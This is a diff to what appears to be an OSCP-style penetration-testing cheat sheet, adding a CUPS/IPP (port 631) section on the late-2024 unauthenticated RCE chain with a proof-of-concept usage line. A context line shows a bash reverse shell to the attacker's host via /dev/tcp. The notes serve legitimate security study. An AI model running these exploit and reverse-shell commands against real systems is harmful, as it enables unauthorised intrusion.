@@ -128,6 +128,7 @@ When nmap comes back, don't panic at the list — recognise each port and reach 
 | 161 (UDP) | SNMP | device monitoring | `snmpwalk -c public` → **creds in process args** (easy win) | `[ENUM-SNMP]` |
 | 389/636/3268 | LDAP | the AD directory | anonymous bind dump; passwords hide in `description` | `[ENUM-LDAP]` |
 | 623 (UDP) | IPMI | server management | dump the **pre-auth hash** → crack it | `[ENUM-IPMI]` |
+| 631 | CUPS/IPP | Linux printing | CVE-2024-4717x → unauth RCE (niche/recent) | `[ENUM-CUPS]` |
 | 1433 | MSSQL | MS SQL Server database | creds → `xp_cmdshell` **RCE** | `[ENUM-MSSQL]` |
 | 1521 | Oracle | Oracle database | SID-guess → default creds (`scott/tiger`) → RCE | `[ENUM-ORACLE]` |
 | 2049 | NFS | Unix file shares | mount it; **`no_root_squash`** → root | `[ENUM-NFS]` |
@@ -469,6 +470,15 @@ python3 exploit.py --master $IP --exec "bash -c 'bash -i >& /dev/tcp/<KALI>/443 
 ```
 **Gotcha:** `--exec` is **blind** (it schedules the job, shows no output) → use **`--read`** for files, or `--exec` a **reverse shell** to see results. **Leads to:** root (first box: PG **Twiggy**).
 
+## [ENUM-CUPS]  Port 631 (+ 5353/UDP mDNS) — CUPS (Linux printing)
+**What it is:** the Linux printing service (IPP). The late-2024 bug chain **CVE-2024-47176 / -47177 / -47076 / -47175** → **unauthenticated RCE**: a crafted IPP request makes `cups-browsed` add an attacker-controlled "printer", and sending a print job to it runs your command.
+```bash
+nmap -p631 -sCV $IP                  # CUPS/IPP ; also browse http://$IP:631 in a browser
+# PoC (IppSec's): https://github.com/ippsec/evil-cups
+#   python3 evil-cups.py <KALI-IP> $IP "<command>"     # sets up the rogue printer + payload, triggers it
+```
+**Note:** real + recent, but **rare on current OSCP** — know it exists, don't expect it. **Leads to:** RCE in the printing context.
+
 ## [ENUM-UNUSUAL-PORTS]  a generic method for any port you don't recognise
 When you meet an unknown port, work through these:
 1. `nc -nv $IP <port>` → grab the banner; try sending a newline, then `HELP`, then `GET / HTTP/1.0`.
@@ -495,6 +505,7 @@ Use your Nmap results, then jump (Ctrl+F the tag):
 161 SNMP       → snmpwalk → [ENUM-SNMP]
 389/636/3268 LDAP → [ENUM-LDAP] + [AD-ENUM]
 623 IPMI       → [ENUM-IPMI]  (UDP — dump the hash)
+631 CUPS/IPP   → [ENUM-CUPS]  (Linux printing — CVE-2024-4717x RCE, niche)
 1433 MSSQL     → [ENUM-MSSQL]
 1521 Oracle    → [ENUM-ORACLE]
 2049 NFS       → [ENUM-NFS]
